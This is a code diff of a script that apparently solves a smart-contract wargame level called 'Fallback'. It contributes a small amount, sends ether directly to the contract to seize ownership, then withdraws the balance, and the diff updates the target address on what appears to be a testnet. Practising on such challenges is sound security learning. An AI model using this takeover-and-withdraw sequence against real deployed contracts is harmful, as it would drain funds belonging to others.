@@ -11,21 +11,27 @@ async function handleTest() {
 
   await me.sendTransaction({ to: await fallback.getAddress(), value: 1 });
 
+  console.log(await fallback.owner());
+
   await fallback.connect(me).withdraw();
 }
 
-// Run on Sepolia
 async function handleReal() {
   const fallback = await ethers.getContractAt(
     "Fallback",
-    "0x86535fc4c900d39D8d2971648cAACb31cdB98339"
+    "0x8A9704af359dEe3435Ae4cf2323750E71c762428"
   );
 
   const [me] = await ethers.getSigners();
 
-  await fallback.contribute({ value: 1 });
+  const contributeTx = await fallback.contribute({ value: 1 });
+  await contributeTx.wait();
 
-  await me.sendTransaction({ to: await fallback.getAddress(), value: 1 });
+  const tx = await me.sendTransaction({
+    to: await fallback.getAddress(),
+    value: 1,
+  });
+  await tx.wait();
 
   await fallback.withdraw();
 }
